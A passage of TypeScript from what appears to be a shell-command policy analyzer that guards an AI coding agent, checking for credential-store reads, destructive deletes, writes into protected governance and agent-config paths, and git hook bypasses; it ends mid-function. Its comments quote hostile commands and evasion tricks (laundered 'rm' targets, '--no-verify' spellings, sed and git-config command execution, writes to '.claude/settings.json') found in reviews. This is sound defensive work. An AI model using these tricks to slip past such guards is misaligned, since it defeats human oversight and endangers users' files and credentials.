    // the search PATTERN is data, not a root: `grep 'rm -rf /' notes.md` searches for that text (exit review 5)
    const patternAt =
      PATTERN_FIRST_HEADS.has(head) && !tokens.some((t) => /^-[a-zA-Z]*[ef]$/.test(t) || /^--(regexp|file)=/.test(t))
        ? tokens.findIndex((t, i) => i > 0 && !t.startsWith('-'))
        : -1;
    for (const [ti, t] of tokens.entries()) {
      if (ti === 0 || ti === patternAt || patternWords.includes(t)) continue;
      if (t.startsWith('-')) continue;
      const expanded = expandHome(t, cwd);
      if (expanded === null || /[$`*?[{]/.test(expanded)) continue;
      const abs = canonicalPath(isAbsolute(expanded) ? expanded : resolve(cwd, expanded))
        .split(sep)
        .join('/');
      if (abs === home || home.startsWith(abs.replace(/\/$/, '') + '/'))
        hits.push({
          capability: 'fs.credential-store.read',
          verdict: verdictFor(table, ctx, 'fs.credential-store.read'),
          via: `recursive read of ${t} reaches credential stores`,
          segment: seg,
          absolute: false,
        });
    }
  }
  // A DESTRUCTIVE VERB WHOSE TARGET CANNOT BE READ HAS AN UNKNOWN TARGET, AND AN UNKNOWN TARGET IS NOT THE
  // REPOSITORY. Every operand carrying a `$` or a backtick is skipped above, correctly — the analyzer cannot know
  // what it expands to — but the segment then fell through to the verb's own matcher, and `rm`'s matcher is the
  // ALLOW capability `fs.repo.delete`. So `rm -f $(cat target.txt)` and `X=/etc/passwd; rm -f $X` removed any file
  // on the machine at ALLOW while `rm -f /etc/passwd` was DENY: the laundering was the whole exploit
  // (exit review 7). Naming the opacity is what the analyzer can honestly say here.
  // THE DERIVED-DIRECTORY ALLOWANCE RESTS ON THE NAME DENOTING DERIVED CONTENT, and a rename or a symlink
  // earlier in the SAME command breaks that: `mv docs dist && rm -rf dist` and `ln -s docs dist && rm -rf dist/`
  // delete the documentation through a name the policy calls regenerable (exit review 8). The write ledger
  // already knows the name was just created, so the allowance simply does not apply to it.
  if (/^(rm|rmdir|unlink)$/.test(head))
    for (const t of tokens.slice(1)) {
      if (t.startsWith('-')) continue;
      const abs = canonicalPath(isAbsolute(t) ? t : resolve(cwd, t.replace(/\/$/, '')));
      if (!written.has(abs) && !written.has('\0any')) continue;
      hits.push({
        capability: 'command.unknown',
        verdict: verdictFor(table, ctx, 'command.unknown'),
        via: `${t} was created or replaced earlier in this command, so what it names now is not what the name says`,
        segment: seg,
        absolute: false,
      });
    }
  if (DESTRUCTIVE_HEADS.has(head)) {
    const opaque = tokens.slice(1).filter((t) => !t.startsWith('-') && /[$`]/.test(t));
    for (const t of opaque)
      hits.push({
        capability: 'command.unknown',
        verdict: verdictFor(table, ctx, 'command.unknown'),
        via: `${head} target ${t} is not readable, so the path it names is unknown`,
        segment: seg,
        absolute: false,
      });
  }
  if (containerPaths || paths.length === 0) return hits;
  for (const p of paths) {
    if (p.abs === null) {
      hits.push({
        capability: 'command.unknown',
        verdict: verdictFor(table, ctx, 'command.unknown'),
        via: `dynamic path ${p.raw}`,
        segment: seg,
        absolute: false,
      });
      continue;
    }
    const posix = p.abs.split(sep).join('/');
    // A glob that expands into the EGO_HOME trust store (`~/.ego/*`, `~/.ego/trust*`, `~/.ego/trus[t]`) or a recursive
    // op over the store's parent (`cp -r ~/.ego …`, `rm -rf ~/.ego`) tampers with / exfiltrates the trust material,
    // which the strict-descendant check misses. The literal prefix is recomputed from the raw token (dest='ALL' and
    // recursive loops store the un-truncated glob in p.abs).
    if (ctx.egoHome) {
      const egoPosix = canonicalPath(ctx.egoHome).split(sep).join('/');
      const expandedRaw = expandHome(p.raw);
      if (expandedRaw !== null) {
        const rawGlob = /[*?[{]/.test(expandedRaw);
        const lit = rawGlob ? expandedRaw.slice(0, expandedRaw.search(/[*?[{]/)) : expandedRaw;
        const litPosix = canonicalPath(isAbsolute(lit) ? lit : resolve(cwd, lit))
          .split(sep)
          .join('/');
        // mv/rename relocate a whole directory tree without a recursive flag, so moving EGO_HOME (or a trust dir) away
        // is a whole-tree op even though `recursive` is false for them
        const wholeTree =
          recursive || head === 'mv' || head === 'rename' || head === 'rm' || head === 'rmdir' || head === 'shred';
        if (reachesTrustStore(litPosix, egoPosix, rawGlob, wholeTree))
          hits.push({
            capability: 'ego.trust.tamper',
            verdict: verdictFor(table, ctx, 'ego.trust.tamper'),
            via: `EGO_HOME trust store (${rawGlob ? 'glob' : recursive ? 'recursive' : 'path'} ${p.raw})`,
            segment: seg,
            absolute: true,
          });
      }
    }
    const isDest =
      dest === 'ALL' ||
      (dest === 'AFTER_DASHDASH' && tokens.indexOf(p.raw) > tokens.indexOf('--')) ||
      (dest !== null && p.raw === dest);
    // reads: credential stores (any spelling, canonicalized), env files; recursive reads of HOME or `/` reach them too
    if (!write || !isDest) {
      const r = classifyPath(table, ctx, 'Read', p.abs);
      // `fs.outside-workspace.read` was dropped here, so the `Read` TOOL asked about a file outside the checkout
      // while `cat` of the same file was ALLOW — the same effect judged differently by the surface that carried
      // it (decision challenge, finding 18).
      if (
        r.via.startsWith('matcher path') ||
        r.capability.startsWith('fs.credential') ||
        (r.capability === 'fs.outside-workspace.read' && !isDevPath(p.abs))
      )
        hits.push({ ...r, via: `path argument ${p.raw} (${r.via})`, segment: seg });
      // a glob whose literal part is an ancestor of HOME (`/U*/me/.ssh/id_rsa`) can expand into a credential store too
      if (
        p.glob &&
        home.startsWith(posix) &&
        /(^|\/)\.([A-Za-z-]{0,16}[*?[{]|ssh|aws|kube|gnupg|azure|docker|netrc|npmrc|pypirc|git-credentials|config)/i.test(
          p.raw,
        )
      )
        hits.push({
          capability: 'fs.credential-store.read',
          verdict: verdictFor(table, ctx, 'fs.credential-store.read'),
          via: `glob ${p.raw} can expand into a credential store`,
          segment: seg,
          absolute: false,
        });
      if (p.glob && globCouldReachCredentials(p.abs))
        hits.push({
          capability: 'fs.credential-store.read',
          verdict: verdictFor(table, ctx, 'fs.credential-store.read'),
          via: `glob ${p.raw} can expand into a credential store`,
          segment: seg,
          absolute: false,
        });
      if (recursive && (posix === home || home.startsWith(posix + '/') || posix === '/'))
        hits.push({
          capability: 'fs.credential-store.read',
          verdict: verdictFor(table, ctx, 'fs.credential-store.read'),
          via: `recursive read of ${p.raw} reaches credential stores`,
          segment: seg,
          absolute: false,
        });
    }
    if (write && isDest) {
      if (p.glob) {
        hits.push({
          capability: 'command.unknown',
          verdict: verdictFor(table, ctx, 'command.unknown'),
          via: `glob destination ${p.raw}`,
          segment: seg,
          absolute: false,
        });
        continue;
      }
      // a device sink is a DISCARD, not a destination — the redirection form has always known this
      // a device is a DISCARD, but a raw block device is a disk and a `/dev/tcp` path is a socket: neither is
      const w = isDevPath(p.raw) && isDeviceDiscard(p.raw)
        ? { verdict: 'ALLOW' as const, via: '', capability: '', absolute: false }
        : classifyPath(table, ctx, 'Write', p.abs);
      if (w.verdict !== 'ALLOW')
        hits.push({ ...w, via: `write destination ${p.raw} (${w.via})`, segment: seg });
      // a destination directory that contains a protected path (copying a tree over .harness/, extracting into it)
      // is the protected write; extracting an archive whose contents the kernel cannot see into an ancestor of a
      // protected path (the repository root) is opaque
      const isArchive = head === 'tar' || head === 'bsdtar' || head === 'gtar' || head === 'unzip';
      const roots = [...ctx.repoRoots, ...(ctx.cwd ? [ctx.cwd] : [])].map((r) =>
        canonicalPath(r).split(sep).join('/'),
      );
      let direct: (typeof table.protectedPaths)[number] | null = null; // the destination IS a protected directory
      let contains: (typeof table.protectedPaths)[number] | null = null; // the destination contains one deeper down
      for (const pp of table.protectedPaths) {
        if (pp.tool === 'Read') continue;
        const prefix = pp.path
          .replace(/^\*\*\//, '')
          .replace(/^~\//, home + '/')
          .split(/[*?[{]/)[0]!
          .replace(/\/$/, '');
        // compared on the FOLDED name, because that is what the filesystem resolves: `mv .harnesſ /tmp/gone`
        // relocates the governance tree on macOS, and a raw string compare read it as a different directory
        // (exit review 8)
        const candidates = (isAbsolute(prefix) ? [prefix] : roots.map((r) => `${r}/${prefix}`)).map(foldName);
        const here = foldName(posix);
        if (candidates.some((c) => c === here)) {
          direct = pp;
          break;
        }
        if (!contains && candidates.some((c) => c.startsWith(here + '/'))) contains = pp;
      }
      // WRITING ONE NAMED FILE INTO THE REPOSITORY ROOT IS NOT A WRITE OF THE REPOSITORY'S PROTECTED SUBTREES.
      // The `contains` rule is what catches a write into `.harness` itself — the protected paths name the files
      // BELOW it, so there is no `direct` match for the directory — and it must keep doing that. What it must
      // not do is fire for a destination that is the ROOT, where "contains a protected path" is true of every
      // checkout: `cp /tmp/foo.txt .` was an ABSOLUTE core deny, the single most ordinary shell command there is
      // (exit review 7). At the root the rule applies only to a write nobody can enumerate.
      // ...AND THE SAME IS TRUE OF EVERY ANCESTOR of a root. `..` "contains .harness/runtime/decisions/**" only
      // because it contains the checkout, so `cp README.md ..` — and `cp x ~`, and every write into any parent
      // directory — was an absolute deny for a write that touches nothing protected (exit review 8). What keeps
      // `rm -rf ..` and `tar -xf a.tar -C ..` denied is the pair of guards below, not this one: a removal and an
      // unenumerable write DO reach the protected subtree, and neither is exempted here.
      const folded = foldName(posix);
      // the trailing slash is normalized away so the FILESYSTEM ROOT is an ancestor like any other: `/` folded
      // is `/`, and comparing against `//` excluded the one directory that contains every checkout
      const foldedDir = folded === '/' ? '' : folded;
      const atRoot = roots.some((r) => {
        const f = foldName(r);
        return f === folded || f.startsWith(foldedDir + '/');
      });
      const unenumerable = isArchive || writesUnenumerably(seg) || recursive;
      // A DELETE IS NOT A WRITE INTO. The `contains` rule exists to catch content PUT somewhere protected; a
      // removal puts nothing there, and its own destructive class already asks. `rm -rf node_modules` — the most
      // routine recovery command in JavaScript development — was refused outright because `node_modules/.bin`
      // is a protected path below it (exit review 7). Removing the protected path ITSELF is still `direct`.
      // A DELETE IS NOT A WRITE INTO — except of EGO's own governance tree, where removing the directory IS the
      // tamper. `rm -rf node_modules` — the most routine recovery command in JavaScript development — was
      // refused outright because `node_modules/.bin` is a protected WRITE path below it, while deleting `.bin`
      // installs no program (exit review 7). `rm -rf .harness` destroys the governance tree and stays denied.
      const removes = /^(rm|rmdir|unlink|shred)$/.test(head);
      const keep = removes ? (contains?.capability.startsWith('ego.') ? contains : null) : contains;
      const pp = direct ?? (atRoot && !unenumerable && !removes ? null : keep);
      if (pp) {
        if (isArchive && !direct) {
          // an archive whose contents the kernel cannot see, extracted into a directory that contains protected paths
          hits.push({
            capability: 'command.archive-extract',
            verdict: verdictFor(table, ctx, 'command.archive-extract'),
            via: `archive extracted into ${p.raw}, which contains protected ${pp.path}`,
            segment: seg,
            absolute: false,
          });
        } else {
          hits.push({
            capability: pp.capability,
            verdict: verdictFor(table, ctx, pp.capability),
            via: `write into ${p.raw}, which ${direct ? 'is' : 'contains'} protected ${pp.path}`,
            segment: seg,
            absolute: isAbsoluteCap(table, pp.capability),
          });
        }
      }
    }
  }
  return hits;
}

/** Whether a command string is a `git commit` with a hook-bypass flag (--no-verify, or a short-flag cluster
 *  containing `n`: -n/-nm/-nam/-vnm). Quote-aware: a `-n` inside the quoted -m/-F message is never a false positive. */
function commitBypassFlag(cmdStr: string): boolean {
  const m = tokenizeMarked(cmdStr);
  const gi = m.findIndex((t) => !t.quoted && t.text.slice(t.text.lastIndexOf('/') + 1) === 'git');
  if (gi < 0) return false;
  const ci = m.findIndex((t, i) => i > gi && !t.quoted && t.text === 'commit');
  if (ci < 0) return false;
  // A short-flag cluster carries --no-verify iff `n` appears before any letter that consumes the rest as a value
  // (`m`/`F` take the message/file). So `-nm`/`-nam`/`-vnm` bypass; `-mn`/`-mfoo` are just a `-m` message.
  const clusterNoVerify = (tok: string): boolean => {
    if (!/^-[A-Za-z]+$/.test(tok)) return false;
    for (const ch of tok.slice(1)) {
      if (ch === 'n') return true;
      if (ch === 'm' || ch === 'F') return false;
    }
    return false;
  };
  // git accepts any UNAMBIGUOUS abbreviation of a long option, so `--no-verif` disables the hooks exactly like
  // `--no-verify`. Accepting every prefix is fail-closed: an ambiguous one makes git error out, never bypass.
  const abbreviatedNoVerify = (tok: string): boolean =>
    tok.length >= 6 && '--no-verify'.startsWith(tok);
  for (let k = ci + 1; k < m.length; k++) {
    const prev = m[k - 1]!;
    // a message/file flag consumes the NEXT token as its value, so that token is data, not a flag — skip it. This
    // includes a short-flag cluster ENDING in `m`/`F` (`-am`, `-nm`, `-qm`): the trailing m/F takes the next token as
    // the message. (The introducer must be unquoted; a quoted `"-m"` is not one. A `-nm` bypass is already caught at
    // the `-nm` token itself before its message is reached.)
    if (
      !prev.quoted &&
      (/^(--message|--file|--reuse-message|--reedit-message|-C|-c)$/.test(prev.text) ||
        /^-[A-Za-z]*[mF]$/.test(prev.text))
    )
      continue;
    // the token's own quotes are already stripped (the shell strips `"-n"`/`-"n"`/`-n"m"` to `-n`/`-nm`). Model the
    // remaining reconstruction tricks: `$IFS`/`${IFS}` field-split the word, and `$""`/`$''`/`$VAR` empty-expand away —
    // so `-n$IFS-m`, `-n${IFS}`, `-n$""` all reduce to a bare `-n` before git parses it.
    // any $-expansion inside a git-commit flag token can field-split ($IFS) or, for an unset/empty variable, VANISH and
    // glue the literal fragments (`-${x}-no-verify` -> `--no-verify`, `-${x}n` -> `-n`). Default-value forms substitute
    // their literal word. Test BOTH a separator substitution and an empty substitution for the residual expansions.
    // A command substitution reaches here as the `$SUBST` marker the segment splitter leaves behind. In a flag
    // position it can expand to anything, including `-n`, so it fails closed. (A substitution used as a message or
    // file VALUE was already skipped above, so `git commit -m "$(date)"` stays allowed.)
    if (m[k]!.text.includes('$SUBST') || /\$\(|`/.test(m[k]!.text)) return true;
    const base = m[k]!.text
      .replace(/\$\{IFS[^}]*\}|\$IFS/g, ' ') // IFS-based expansions always field-split
      .replace(/\$\{[A-Za-z_][A-Za-z0-9_]*:?[-=+?]([^}]*)\}/g, '$1'); // ${x:-D}/${x:=D}/${x-D}/${x:+A} -> the literal word
    const residual = /\$\{[^}]*\}|\$[A-Za-z_][A-Za-z0-9_]*|\$[-@*#?!0-9]|\$/g;
    for (const sub of [' ', '']) {
      for (const part of base.replace(residual, sub).split(/\s+/)) {
        if (part === '--no-verify' || abbreviatedNoVerify(part) || clusterNoVerify(part)) return true;
      }
    }
  }
  return false;
}

/** The command strings carried in a quoted `env -S`/`--split-string`/`-c` value, whose inner quoting is preserved so a
 *  carried `git commit` can be scanned the same way as a top-level one. */
/** WHERE A COMMAND RUNS BECAUSE OF ITS OWN OPTIONS: `env -C DIR`, `env --chdir=DIR`, `git -C DIR`, through whatever
 *  wrappers stand in front of it. One reader, with the option parsers the tools really have:
 *    - env: `-u NAME` takes a value, clusters (`-iC dir`, `-iCdir`), unique abbreviations of the long options
 *      (`--chd=`, `--ch=`), and `-S STRING`, which is a command line of its own that env splits and runs;
 *    - git: a global option either takes a value (`-C`, `-c`, `--git-dir`, …) or does not (`--no-pager`, `--bare`, …),
 *      and one this table does not know leaves the verb's position - and so the directory - unknown.
 *  Three regexes had been doing this job, each assuming every option is one token and every word is spelled plainly
 *  (exit review 10, self-attack: seven findings). Returns null when the command names no directory. */
const RUN_DIR_HEADS: ReadonlySet<string> = new Set(['env', 'git']);
function runDirectory(seg: string, base: string): { dir: string; known: boolean } | null {
  let words = commandWords(tokenizeMarked(expandBraces(seg.trim()))).map((x) => x.text);
  let dir = base;
  let found = false;
  let known = true;
  for (let guard = 0; guard < 8; guard++) {
    const hi = commandHeadIndex(words, RUN_DIR_HEADS);
    const head = (words[hi] ?? '').replace(/^.*\//, '');
    if (head === 'env') {
      let i = hi + 1;
      let next: string[] | null = null;
      const LONG = ['ignore-environment', 'null', 'unset', 'chdir', 'split-string', 'debug', 'argv0', 'default-signal', 'ignore-signal', 'block-signal', 'list-signal-handling', 'help', 'version'];
      const VALUED_LONG = new Set(['unset', 'chdir', 'split-string', 'argv0', 'default-signal', 'ignore-signal', 'block-signal']);
      for (; i < words.length; i++) {
        const w = words[i]!;
        if (w === '--') {
          i++;
          break;
        }
        if (!w.startsWith('-') || w === '-') break;
        const takeValue = (glued: string): string | undefined => (glued !== '' ? glued : words[++i]);
        if (w.startsWith('--')) {
          const eq = w.indexOf('=');
          const name = w.slice(2, eq < 0 ? undefined : eq);
          const cands = LONG.filter((l) => l === name || l.startsWith(name));
          const l = cands.includes(name) ? name : cands.length === 1 ? cands[0]! : null;
          if (!l) {
            known = false;
            continue;
          }
          const v = VALUED_LONG.has(l) ? (eq >= 0 ? w.slice(eq + 1) : words[++i]) : undefined;
          if (l === 'chdir' && v !== undefined) {
            dir = isAbsolute(v) ? v : resolve(dir, v);
            found = true;
          } else if (l === 'split-string' && v !== undefined) {
            next = [...tokenize(v), ...words.slice(i + 1)];
            i = words.length;
          }
          continue;
        }
        // a cluster of short options: `-i`, `-0`, `-v` take nothing; `-u`, `-C`, `-S`, `-a` take a value, glued or next
        for (let k = 1; k < w.length; k++) {
          const c = w[k]!;
          if (c === 'C' || c === 'S' || c === 'u' || c === 'a') {
            const v = takeValue(w.slice(k + 1));
            if (c === 'C' && v !== undefined) {
              dir = isAbsolute(v) ? v : resolve(dir, v);
              found = true;
            } else if (c === 'S' && v !== undefined) {
              next = [...tokenize(v), ...words.slice(i + 1)];
              i = words.length;
            }
            break;
          }
          if (!/[i0vx]/.test(c)) known = false;
        }
        if (next) break;
      }
      // a `-S` string is env's OWN argv - its options, assignments and command - so it is read as `env` again
      words = next ? ['env', ...next] : words.slice(i);
      // env's own remaining words: assignments precede the command
      while (words.length && words[0] !== 'env' && /^[A-Za-z_][A-Za-z0-9_]*=/.test(words[0]!)) words = words.slice(1);
      continue;
    }
    if (head === 'git') {
      let i = hi + 1;
      const t = GLOBAL_OPTIONS['git']!;
      for (; i < words.length; i++) {
        const w = words[i]!;
        if (!w.startsWith('-')) break;
        if (w === '-C' || /^-C./.test(w)) {
          const v = w === '-C' ? words[++i] : w.slice(2);
          if (v !== undefined) {
            dir = isAbsolute(v) ? v : resolve(dir, v);
            found = true;
          }
        } else if (w.includes('=') || t.bool.test(w) || /^--(exec-path|list-cmds|html-path|man-path|info-path)/.test(w)) continue;
        else if (t.value.test(w)) i++;
        else {
          known = false;
          break;
        }
      }
      return found ? { dir, known } : null;
    }
    break;
  }
  return found ? { dir, known } : null;
}

function carrierCommandValues(seg: string): string[] {
  const m = tokenizeMarked(seg);
  const out: string[] = [];
  // `sh -n -c BODY` PARSES the body and executes nothing - a syntax check, the way an author verifies a script
  // before trusting it (exit review 10). The body is not a command the shell will run.
  const shellAt = m.findIndex((t) => /^(?:.*\/)?(ba|z|da|k)?sh$/.test(t.text));
  if (shellAt >= 0 && m.slice(shellAt + 1).some((t) => !t.quoted && (t.text === '--noexec' || /^-[a-zA-Z]*n[a-zA-Z]*$/.test(t.text)))) return out;
  const words = m.map((x) => x.text);
  // the wrappers that take their command as an option value: `flock LOCK -c BODY`, `--command BODY`, `--comm=BODY`, `-xc BODY`
  const wi = words.findIndex((w) => /^(?:.*\/)?(flock|su|runuser)$/.test(w));
  if (wi >= 0) {
    const body = operandWrapperBody(words, wi);
    if (body !== null) out.push(body);
  }
  for (let i = 0; i < m.length; i++) {
    const t = m[i]!.text;
    if ((t === '-c' || t === '-S' || t === '--split-string') && m[i + 1]) out.push(m[i + 1]!.text);
    else if (t.startsWith('--split-string=')) out.push(t.slice('--split-string='.length));
    else if (t.startsWith('-S') && t.length > 2 && !t.startsWith('--')) out.push(t.slice(2));
    // `-iS`, `-vS` and the abbreviations of --split-string: env's option parser accepts all of them
    else if (/^-[0-9A-Za-z]+S$/.test(t) && m[i + 1]) out.push(m[i + 1]!.text);
    else if (t.startsWith('--s') && t.length > 3 && 'split-string'.startsWith(t.slice(2).split('=')[0]!)) {
      if (t.includes('=')) out.push(t.slice(t.indexOf('=') + 1));
      else if (m[i + 1]) out.push(m[i + 1]!.text);
    }
  }
  return out;
}

/** Every command string this segment CARRIES: `sh -c BODY`, `env -S BODY`, `trap BODY SIG`, `sh <<< BODY`. The
 *  normalizer already expands each of them — but it returns normalized STRINGS, which projects a pipeline EDGE
 *  away, so `sh -c "echo 'rm -rf /' | bash"` lost the very relation that makes it an execution (exit review 4).
 *  A body that contains an edge re-enters the canonical analyzer whole. */
function carriedShellBodies(seg: string): string[] {
  const out = [...carrierCommandValues(seg)];
  const t = tokenize(seg);
  const head = (t[0] ?? '').replace(/^.*\//, '');
  if (head === 'trap' && t[1] !== undefined && !t[1].startsWith('-')) out.push(t[1]);
  const here = t.indexOf('<<<');
  if (here >= 0 && t[here + 1] !== undefined) out.push(t[here + 1]!);
  return out;
}

/** AWK FORKS A SHELL, and the command it forks is a string EXPRESSION: `system("CMD")`, `print … | "CMD"` and
 *  `"CMD" | getline`. When that expression is a LITERAL — written inline, or held in a variable the same program
 *  assigns a literal to — the command is KNOWN, and reporting only opacity left a `git push origin main` at ASK
 *  where the same text anywhere else is an organization-locked deny (exit review 7).
 *
 *  Separate from `carriedShellBodies` because these bodies have no other route into the analyzer: the normalizer
 *  reaches a `trap` or a herestring body on its own, and it has no path for an awk program at all. */
/** WHERE THE COMMAND ACTUALLY STARTS. `FOO=bar awk …`, `sudo git …`, `timeout 5 sed …` and `command awk …` are
 *  all the same invocation as the bare one; a carrier anchored at token 0 sees none of them, which the producer
 *  cross-product finds the moment such a carrier is added. */
function commandHeadIndex(t: readonly string[], stopAt?: ReadonlySet<string>): number {
  let i = 0;
  while (i < t.length) {
    const w = t[i]!;
    // a caller that wants to read a wrapper's OWN options (env -C) stops at it instead of looking through it
    if (stopAt?.has(w)) break;
    // `flock [-nsxuo] [-w SECS] [-E N] LOCKFILE COMMAND` - the lock file is an operand of the wrapper, and the command
    // follows it (the `-c CMD` spelling is a carrier and is read as one)
    if (w === 'flock' && !t.slice(i).some((x) => /^(-[a-zA-Z]*c|--command)/.test(x))) {
      i++;
      while (i < t.length && t[i]!.startsWith('-')) {
        const opt = t[i]!;
        i++;
        if (/^(-w|--timeout|-E|--conflict-exit-code)$/.test(opt)) i++;
      }
      i++; // the lock file
      continue;
    }
    if (
      /^[A-Za-z_][A-Za-z0-9_]*=/.test(w) ||
      WRAPPERS.has(w) ||
      PREFIX_KEYWORDS.has(w) ||
      /^(timeout|sudo|doas|xargs|--)$/.test(w)
    ) {
      i++;
      // a wrapper's own operands: `nice -n 5`, `timeout 60`, `exec -c -a NAME`, `command -p`
      while (i < t.length && /^(-|\d)/.test(t[i]!)) {
        const opt = t[i]!;
        i++;
        // ...and only the ones that TAKE a value consume the next token: `command -p sed …` has none, and
        // treating `-p` as valued swallowed `sed` itself (self-attack on exit review 9)
        if (/^(-n|-a|-C|-u|-g|-t)$/.test(opt) && i < t.length && !t[i]!.startsWith('-')) i++;
      }
      continue;
    }
    break;
  }
  return i;
}

/** THE COMMANDS A SED SCRIPT RUNS. GNU sed's `e` command executes a shell command and splices its output into
 *  the stream: `gsed '1e git push origin main' f.txt` pushes. The text is RIGHT THERE in the script, and
 *  reporting it as opacity gave an absolute deny the approvable ASK of "something ran that I did not read"
 *  (exit review 8). The `e` FLAG on a substitution (`s/x/y/e`) executes the PATTERN SPACE, which is content
 *  this kernel has not seen; that stays opacity, which is what it is. */
/** Every sed SCRIPT this command runs, and every script FILE it names that could not be read. A `-f` file inside
 *  the workspace IS readable, and reading it is the difference between knowing what the script does and guessing:
 *  `sed -fevil.sed package.json` with `w .git/hooks/pre-commit` in the file installed a git hook at ALLOW
 *  (exit review 9). A `-f` file outside the workspace, or one that is not there, stays unread and is reported. */
function sedScripts(
  seg: string,
  ctx?: EvaluationContext,
  cwd?: string,
): { texts: string[]; unread: string[] } | null {
  const t = tokenize(seg);
  const i = commandHeadIndex(t);
  if (!/^(sed|gsed)$/.test((t[i] ?? '').replace(/^.*\//, ''))) return null;
  // the script is every `-e`/`--expression` value, or — when none was given — the first bare operand
  const texts: string[] = [];
  const unread: string[] = [];
  let sawE = false;
  let sawF = false;
  const readScript = (f: string): void => {
    sawF = true;
    if (!ctx || cwd === undefined || /[$`*?]/.test(f)) {
      unread.push(f);
      return;
    }
    const text = readInsideWorkspace(ctx, isAbsolute(f) ? f : resolve(cwd, f));
    if (text === null) unread.push(f);
    else texts.push(text);
  };
  for (let j = i + 1; j < t.length; j++) {
    const w = t[j]!;
    if (w === '-e' || w === '--expression') {
      if (t[j + 1] !== undefined) { texts.push(t[j + 1]!); sawE = true; j++; }
      continue;
    }
    const eq = /^(?:--expression=|-e)(.+)$/.exec(w);
    if (eq) { texts.push(eq[1]!); sawE = true; continue; }
    // a script FILE — and `-f` also means NO bare operand is the script: with it every operand is an INPUT, so
    // reading the first one as a script made `sed -f s.sed '1e git push'` deny a file whose NAME happens to
    // look like a script (self-attack, exit review 8)
    // `-f` MAY SIT IN A CLUSTER. `sed -nf evil.sed` is `-n -f evil.sed`, and matching only the bare and glued
    // forms left the script file unread — so a `w .claude/settings.json` inside it installed nothing anyone saw
    // (self-attack on exit review 9). In a cluster `f` must be LAST, because it consumes the rest.
    if (w === '-f' || w === '--file' || /^-[a-zA-Z]*f$/.test(w)) {
      if (t[j + 1] !== undefined) readScript(t[j + 1]!);
      j++;
      continue;
    }
    const feq = /^(?:--file=|-[a-zA-Z]*f)(.+)$/.exec(w);
    if (feq) { readScript(feq[1]!); continue; }
    if (w.startsWith('-')) continue;
    if (!sawE && !sawF && !texts.length) texts.push(w);
  }
  return { texts, unread };
}

function sedShellCommands(seg: string, ctx?: EvaluationContext, cwd?: string): string[] {
  const scripts = sedScripts(seg, ctx, cwd);
  if (!scripts) return [];
  const out: string[] = [];
  for (const script of scripts.texts)
    for (const line of script.split('\n'))
      // an address may select the lines: a line number, `$`, a range, or a `/regex/`. `e` then takes the REST
      // of the line as the command.
      for (const m of line.matchAll(/(?:^|;)\s*(?:\/(?:\\.|[^/])*\/|[0-9$,~+]+)?\s*!?\s*e[ \t]+([^\n]+)/g))
        out.push(m[1]!.trim());
  return out;
}

/** The files a sed script WRITES. `w FILE` and `W FILE` write the pattern space to FILE, and `s/x/y/w FILE`
 *  writes it when the substitution succeeds — an ordinary `sed -n '1w .claude/settings.json' README.md` replaces
 *  the agent's own configuration, at ALLOW, because nothing read the script for its destinations (exit review 9).
 *  The filename runs to the END OF THE LINE, which is what sed documents: a `;` after it is part of the name. */
function sedWrittenFiles(seg: string, ctx?: EvaluationContext, cwd?: string): string[] {
  const scripts = sedScripts(seg, ctx, cwd);
  if (!scripts) return [];
  const out: string[] = [];
  for (const script of scripts.texts)
    for (const line of script.split('\n')) {
      // the bare `w`/`W` command, with its optional address in front
      // AN ADDRESS MAY BE A RANGE, AND A COMMAND MAY SIT IN A BRACED BLOCK. `1,/x/w FILE` and `1{w FILE\n}` are
      // both ordinary sed, and an address pattern that allowed only ONE line number or ONE regex matched
      // neither, so the destination went unread (self-attack on exit review 9).
      for (const m of line.matchAll(
        /(?:^|[;{])\s*(?:(?:\/(?:\\.|[^/])*\/|\$|[0-9~+]+)(?:\s*,\s*(?:\/(?:\\.|[^/])*\/|\$|[0-9~+]+))?)?\s*!?\s*\{?\s*[wW][ \t]+([^\n;}]+)/g,
      ))
        out.push(m[1]!.trim());
      // the `w` FLAG of a substitution, which comes after the closing delimiter and its other flags
      for (const m of line.matchAll(/s(.)(?:\\.|(?!\1).)*\1(?:\\.|(?!\1).)*\1[gpiImMe0-9]*w[ \t]+([^\n]+)/g))
        out.push(m[2]!.trim());
    }
  return out;
}

/** THE VALUE OF AN EXECUTING GIT CONFIG KEY IS A COMMAND, AND IT IS RIGHT THERE. `git -c
 *  core.alternateRefsCommand="sh -c \"git push origin main\"" fetch origin` runs that shell command, and the
 *  key was reported as opacity — an ASK — over text the kernel can read (exit review 9). Only the keys whose
 *  value git EXECUTES are read this way; a key whose value is a path, a boolean or a number is not a command.
 *  An unreadable or dynamic value keeps the opacity it already has. */
const GIT_EXEC_CONFIG_KEY =
  /^(core\.(hooksPath|fsmonitor|editor|pager|sshCommand|gitProxy|askPass|alternateRefsCommand)|sequence\.editor|merge\.[^.]+\.driver|diff\.[^.]+\.(textconv|command)|diff\.external|alias\.|filter\.|credential\.[^=]*helper|uploadpack\.[^=]*Hook|pager\.|difftool\.|mergetool\.|guitool\.|trailer\.[^.]+\.command|gpg\.[^.]*program|ssh\.variant)/i;

function gitConfigCommands(seg: string): string[] {
  const t = tokenizeMarked(seg).map((x) => x.text);
  if (!/^git$/.test((t[commandHeadIndex(t)] ?? '').replace(/^.*\//, ''))) return [];
  const out: string[] = [];
  for (let i = 0; i < t.length; i++) {
    const w = t[i]!;
    const kv =
      w === '-c' || w === '--config' || w === '--config-env'
        ? (t[i + 1] ?? null)
        : (/^(?:--config=|--config-env=|-c)(.+)$/.exec(w)?.[1] ?? null);
    if (kv === null) continue;
    const eq = kv.indexOf('=');
    if (eq < 0) continue;
    const key = kv.slice(0, eq);
    const value = kv.slice(eq + 1);
    // a value that is a bare PATH, a boolean or a number names no command line to read
    if (!GIT_EXEC_CONFIG_KEY.test(key) || !value.trim() || /^[\w./~-]+$/.test(value)) continue;
    out.push(value);
  }
  return out;
}

/** THE PAGER IS A COMMAND, AND `git grep -O<cmd>` RUNS IT. Git spells it `-O<pager>` (glued only) and
 *  `--open-files-in-pager=<pager>`; the value is a shell command line that git runs with the matching files
 *  appended, so `git grep -O'git push origin main #' hello` pushes and the `#` eats the file list. It arrived as
 *  `command.script-opaque` — an ASK — over text the kernel can read perfectly well (exit review 8). */
function gitPagerCommands(seg: string): string[] {
  const t = tokenize(seg);
  // the head is where the COMMAND starts, not at token 0: `sudo git …`, `FOO=bar git …` and `timeout 5 git …`
  // are the same invocation, and anchoring at position 0 missed every one of them (found by the cross-product)
  if (!/^git$/.test((t[commandHeadIndex(t)] ?? '').replace(/^.*\//, ''))) return [];
  const out: string[] = [];
  for (const w of t) {
